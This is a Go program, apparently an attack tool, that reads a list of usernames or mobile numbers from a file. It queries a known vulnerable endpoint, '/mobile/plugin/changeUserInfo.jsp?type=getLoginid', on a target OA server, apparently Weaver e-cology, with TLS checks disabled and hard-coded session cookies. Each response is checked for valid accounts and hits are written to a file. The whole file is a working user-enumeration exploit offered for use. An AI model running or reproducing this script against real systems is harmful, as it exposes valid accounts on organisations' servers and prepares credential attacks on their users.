package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	fmt.Println("start")
	var nameFile string
	var url string
	var sleeps int
	flag.StringVar(&nameFile, "f", "name.txt", "name file")
	flag.StringVar(&url, "u", "http://127.0.0.1", "url")
	flag.IntVar(&sleeps, "s", 0, "延时:秒")
	flag.Parse()
	names := list(nameFile)
	Httpget(url, names, sleeps)
}
func Httpget(url string, names []string, sleeps int) {
	for _, name := range names {
		fmt.Println("判断用户 : " + name)
		url := url + "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=" + name
		cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
		request, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println(err)
		}

		request.Header.Add("Cookie", "acw_tc=784e2ca516844807767915002e3bea736715a3d331aa36f7ccb35bfe5c1e61; ecology_JSessionid=aaacdQ-VJonPAfOkhHqGy; JSESSIONID=aaacdQ-VJonPAfOkhHqGy; __randcode__=80a5489b-27e6-4e01-a9d0-34b3cebce19c")
		request.Header.Add("Upgrade-Insecure-Requests", "1")
		request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
		request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
		request.Header.Add("Sec-Fetch-Site", "none")
		request.Header.Add("Sec-Fetch-Mode", "navigate")
		request.Header.Add("Sec-Fetch-User", "?1")
		request.Header.Add("Sec-Fetch-Dest", "document")
		request.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
		request.Header.Add("Connection", "close")

		do, err := cli.Do(request)
		if err != nil {
			fmt.Println(err)
		}
		defer func() {
			_ = do.Body.Close()
		}()
		all, _ := ioutil.ReadAll(do.Body)
		html := string(all)
		//fmt.Println(html)
		time.Sleep(time.Duration(sleeps) * time.Second)
		if strings.Contains(html, "login") {
			fmt.Println(url)
			ok, _ := os.OpenFile("findname.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
			ok.Write([]byte(url + "\r\n"))
			defer ok.Close()
		}
	}
}
func list(urlfile string) []string {
	var url_list []string
	url_file, err := os.Open(urlfile)
	if err != nil {
		fmt.Println("Can't open urlfile")
		os.Exit(0)
	}
	defer url_file.Close()
	reader_Url := bufio.NewReader(url_file)
	for {
		url, err := reader_Url.ReadString('\n')
		url = strings.Replace(url, " ", "", -1)
		url = strings.Replace(url, "\n", "", -1)
		url = strings.Replace(url, "\r", "", -1)
		url_list = append(url_list, url)
		if err == io.EOF {
			break
		}
	}
	return url_list
}
